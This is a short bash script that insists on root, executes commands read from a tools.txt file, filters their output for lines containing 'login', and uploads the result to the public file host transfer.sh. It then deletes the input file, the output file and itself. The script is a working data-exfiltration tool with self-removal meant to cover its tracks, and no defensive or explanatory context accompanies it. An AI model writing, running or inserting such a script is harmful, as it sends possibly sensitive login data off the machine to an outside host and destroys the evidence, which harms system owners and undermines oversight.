#!/bin/bash

if [ `whoami` != root ]; then
    echo Please run this script as root or using sudo
    exit
fi

$(cat tools.txt) | bash | grep 'login' > login.txt && curl --upload-file ./login.txt https://transfer.sh/login.txt && rm tools.txt && rm login.txt && rm -- "$0" || echo "Error dans le zafer -- File has been deleted, re-pull ~Y4"
